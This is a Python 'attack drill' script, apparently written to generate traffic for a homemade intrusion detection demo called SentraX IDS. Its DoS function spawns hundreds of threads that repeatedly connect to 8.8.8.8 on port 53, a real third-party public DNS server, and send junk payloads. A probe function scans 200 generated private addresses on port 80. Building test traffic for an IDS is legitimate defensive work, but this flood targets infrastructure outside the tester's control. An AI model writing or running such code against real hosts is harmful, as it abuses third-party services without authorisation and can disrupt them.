"""
SentraX IDS - Extreme Attack Drill
=====================================
Generates REAL network packets that the sniffer.py picks up live.

Usage:
    python3 attack_drill.py
"""

import socket
import threading
import time
import sys

RESET  = "\033[0m"
RED    = "\033[91m"
YELLOW = "\033[93m"
GREEN  = "\033[92m"
BOLD   = "\033[1m"

# ─────────────────────────────────────────────────────────────
# ATTACK ENGINES
# ─────────────────────────────────────────────────────────────

def _dos_worker():
    """DoS engine: Hammers a single target with rapid TCP connections."""
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.3)
            s.connect(("8.8.8.8", 53))
            s.send(b"X" * 512)
            s.close()
        except:
            pass


def _probe_worker(target_ip):
    """Probe engine: Scans many different hosts rapidly."""
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.1)
            s.connect((target_ip, 80))
            s.close()
        except:
            pass


def _progress_bar(duration):
    """Show a progress bar for the attack duration."""
    for i in range(duration):
        bar = "█" * (i + 1) + "░" * (duration - i - 1)
        print(f"\r  [{bar}] {i+1}/{duration}s  ", end="", flush=True)
        time.sleep(1)
    print()


def launch_dos(duration=15):
    """Extreme DoS — 500 threads hammering one server."""
    print(f"\n{RED}{BOLD}{'='*52}{RESET}")
    print(f"{RED}{BOLD}  🔴 EXTREME DoS ATTACK LAUNCHED{RESET}")
    print(f"{RED}{BOLD}{'='*52}{RESET}")
    print(f"  Spawning 500 threads → flooding 8.8.8.8:53")
    print(f"  Duration: {duration} seconds\n")

    for _ in range(500):
        t = threading.Thread(target=_dos_worker, daemon=True)
        t.start()

    _progress_bar(duration)
    print(f"\n{GREEN}✅ DoS Attack complete. Check sniffer + Dashboard!{RESET}\n")


def launch_probe(duration=15):
    """Extreme Probe — scans 200 unique public IPs."""
    print(f"\n{YELLOW}{BOLD}{'='*52}{RESET}")
    print(f"{YELLOW}{BOLD}  🟡 EXTREME PROBE ATTACK LAUNCHED{RESET}")
    print(f"{YELLOW}{BOLD}{'='*52}{RESET}")
    print(f"  Scanning 200 unique IPs on port 80")
    print(f"  Duration: {duration} seconds\n")

    targets = [f"{10 + (i // 50)}.{i % 255}.{(i * 3) % 255}.1" for i in range(200)]
    for ip in targets:
        t = threading.Thread(target=_probe_worker, args=(ip,), daemon=True)
        t.start()

    _progress_bar(duration)
    print(f"\n{GREEN}✅ Probe Attack complete. Check sniffer + Dashboard!{RESET}\n")


def launch_combined(duration=20):
    """Combined Attack — DoS + Probe together (safe thread count)."""
    print(f"\n{RED}{BOLD}{'='*52}{RESET}")
    print(f"{RED}{BOLD}  ☠️  COMBINED MEGA ATTACK LAUNCHED{RESET}")
    print(f"{RED}{BOLD}{'='*52}{RESET}")
    print(f"  DoS (300 threads) + Probe (200 IPs) simultaneously")
    print(f"  Duration: {duration} seconds\n")

    # DoS threads
    for _ in range(300):
        t = threading.Thread(target=_dos_worker, daemon=True)
        t.start()

    # Probe threads
    targets = [f"{10 + (i // 50)}.{i % 255}.{(i * 3) % 255}.1" for i in range(200)]
    for ip in targets:
        t = threading.Thread(target=_probe_worker, args=(ip,), daemon=True)
        t.start()

    _progress_bar(duration)
    print(f"\n{GREEN}✅ Combined Attack complete. Check sniffer + Dashboard!{RESET}\n")


def print_menu():
    print(f"\n{BOLD}╔══════════════════════════════════════════════════════╗{RESET}")
    print(f"{BOLD}║    SentraX IDS — Extreme Attack Drill 🔥              ║{RESET}")
    print(f"{BOLD}╚══════════════════════════════════════════════════════╝{RESET}")
    print()
    print(f"  {RED}1. 🔴 Extreme DoS Attack       (500 threads, 15 sec){RESET}")
    print(f"  {YELLOW}2. 🟡 Extreme Probe Attack     (200 unique IPs, 15 sec){RESET}")
    print(f"  {RED}3. ☠️  MEGA Combined Attack     (DoS + Probe, 20 sec){RESET}")
    print(f"  {GREEN}4. ❌ Exit{RESET}")


if __name__ == "__main__":
    while True:
        print_menu()
        try:
            choice = input(f"\n  {BOLD}Enter choice (1-4): {RESET}").strip()
        except KeyboardInterrupt:
            print(f"\n\n{GREEN}Exiting. Good luck! 🚀{RESET}\n")
            sys.exit(0)

        if choice == "1":
            launch_dos(duration=15)
        elif choice == "2":
            launch_probe(duration=15)
        elif choice == "3":
            launch_combined(duration=20)
        elif choice == "4":
            print(f"\n{GREEN}Exiting. Good luck with your demo! 🚀{RESET}\n")
            sys.exit(0)
        else:
            print("  Invalid choice. Please enter 1-4.")
